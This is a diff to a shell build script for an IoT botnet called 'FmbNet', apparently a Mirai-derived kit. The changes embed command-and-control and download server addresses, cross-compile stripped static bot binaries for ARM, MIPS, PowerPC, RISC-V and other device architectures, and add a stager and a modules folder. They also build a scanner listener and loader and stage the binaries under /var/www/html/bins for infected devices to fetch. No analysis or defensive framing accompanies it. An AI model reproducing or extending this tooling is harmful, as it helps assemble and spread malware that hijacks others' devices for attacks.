@@ -20,8 +20,10 @@ PROTO_MAGIC="${PROTO_MAGIC:-$(printf '0x%04X' $((0x4000 + RANDOM % 0x3FFF)))}"
 INSTANCE_PORT="${INSTANCE_PORT:-$((13320 + RANDOM % 100))}"
 SHARED_SECRET="${SHARED_SECRET:-$PROTO_KEY}"
 NP_BUILD_RAND=${NP_BUILD_RAND:-$RANDOM}
+BOT_VERSION="${BOT_VERSION:-FmbNet/2.0}"
 PROTO_DEF='-DPROTO_KEY_HEX="'"$PROTO_KEY"'"'
 PROTO_DEF="$PROTO_DEF -DSHARED_SECRET_HEX=\"$SHARED_SECRET\""
+PROTO_DEF="$PROTO_DEF -DBOT_VERSION=\"$BOT_VERSION\""
 PROTO_DEF="$PROTO_DEF -DPROTO_MAGIC_BOT=$PROTO_MAGIC -DNP_INSTANCE_PORT=$INSTANCE_PORT -DNP_BUILD_RAND=$NP_BUILD_RAND"
 
 RELEASE="$PROJECT_DIR/release"
@@ -40,7 +42,7 @@ sed -i "s|#define TFTP_SERVER \".*\"|#define TFTP_SERVER \"$SERVER_IP\"|" loader
 sed -i "s|addrs\[0\] = inet_addr(\".*\");|addrs[0] = inet_addr(\"$SERVER_IP\");|" loader/src/main.c
 
 dlr_ip=$(echo "$SERVER_IP" | tr '.' ',')
-sed -i "s|#define GRPC_SERVER utils_inet_addr(.*)|#define GRPC_SERVER utils_inet_addr($dlr_ip)|" dlr/main.c
+sed -i "s|#define BIN_SERVER utils_inet_addr(.*)|#define BIN_SERVER utils_inet_addr($dlr_ip)|" dlr/main.c
 
 sed -i "s|net.Listen(\"tcp\", \"[^\"]*\"|net.Listen(\"tcp\", \"$CNC_IP:34130\"|" scanListen.go
 
@@ -71,11 +73,14 @@ compile_x86() {
 compile_multi() {
 	local specs=(
 		"i686-linux-gnu:fmbnet.x86:x86:X32"
-		"mips-linux-gnu:fmbnet.mips:mips:MIPS"
-		"mipsel-linux-gnu:fmbnet.mpsl:mpsl:MIPSEL"
 		"arm-linux-gnueabi:fmbnet.arm:arm:ARM"
 		"arm-linux-gnueabihf:fmbnet.arm7:arm7:ARM"
+		"aarch64-linux-gnu:fmbnet.aarch64:aarch64:AARCH64"
 		"powerpc-linux-gnu:fmbnet.ppc:ppc:PPC"
+		"powerpc64le-linux-gnu:fmbnet.ppc64le:ppc64le:PPC64LE"
+		"riscv64-linux-gnu:fmbnet.riscv64:riscv64:RISCV64"
+		"mips-linux-gnu:fmbnet.mips:mips:MIPS"
+		"mipsel-linux-gnu:fmbnet.mpsl:mpsl:MIPSEL"
 	)
 	for spec in "${specs[@]}"; do
 		prefix="${spec%%:*}"
@@ -90,7 +95,11 @@ compile_multi() {
 			files=($(ls bot/*.c | shuf 2>/dev/null || ls bot/*.c))
 			${prefix}-gcc -std=c99 -static -DNP_TELNET $PROTO_DEF -ffunction-sections -fdata-sections \
 				-w -Os ${files[@]} -o "$RELEASE/$out" -Dfmbnet_BOT_ARCH=\"$arch\" -lpthread -ldl -Wl,--gc-sections
-			${prefix}-strip -s -x "$RELEASE/$out" 2>/dev/null || ${prefix}-strip "$RELEASE/$out" -S --strip-unneeded 2>/dev/null || true
+			if [ ! -f "$RELEASE/$out" ]; then
+				echo "[!] $out NOT created — compilation failed!"
+			else
+				${prefix}-strip -s -x "$RELEASE/$out" 2>/dev/null || ${prefix}-strip "$RELEASE/$out" -S --strip-unneeded 2>/dev/null || true
+			fi
 		else
 			echo "[!] skip $out (${prefix}-gcc not found)"
 		fi
@@ -106,11 +115,14 @@ fi
 mkdir -p dlr/release
 dlr_specs=(
 	"i686-linux-gnu:x86:X32"
-	"mips-linux-gnu:mips:MIPS"
-	"mipsel-linux-gnu:mpsl:MIPSEL"
 	"arm-linux-gnueabi:arm:ARM"
 	"arm-linux-gnueabihf:arm7:ARM"
+	"aarch64-linux-gnu:aarch64:AARCH64"
 	"powerpc-linux-gnu:ppc:PPC"
+	"powerpc64le-linux-gnu:ppc64le:PPC64LE"
+	"riscv64-linux-gnu:riscv64:RISCV64"
+	"mips-linux-gnu:mips:MIPS"
+	"mipsel-linux-gnu:mpsl:MIPSEL"
 )
 for spec in "${dlr_specs[@]}"; do
 	prefix="${spec%%:*}"
@@ -144,10 +156,19 @@ go build -o "$RELEASE/scanListen" ./scanListen.go
 echo "[*] building loader"
 gcc -static -O3 -lpthread -pthread loader/src/*.c -o "$RELEASE/loader"
 
+echo "[*] building stager"
+gcc -static -O2 loader/stager.c -o "$RELEASE/stager" 2>/dev/null || \
+gcc -O2 loader/stager.c -o "$RELEASE/stager" 2>/dev/null || \
+echo "[!] stager compile failed"
+
 LOADER_BINS="$RELEASE/loader_bins"
 mkdir -p "$LOADER_BINS/bins"
 cp dlr/release/dlr.* "$LOADER_BINS/bins/" 2>/dev/null || true
 cp "$RELEASE/loader" "$LOADER_BINS/"
+
+echo "[*] creating modules directory"
+mkdir -p "$RELEASE/modules/src"
+cp modules/src/*.c "$RELEASE/modules/src/" 2>/dev/null || true
 
 echo "[*] deploying to /var/www/html/bins and /opt/fmbnet"
 sudo mkdir -p /var/www/html/bins
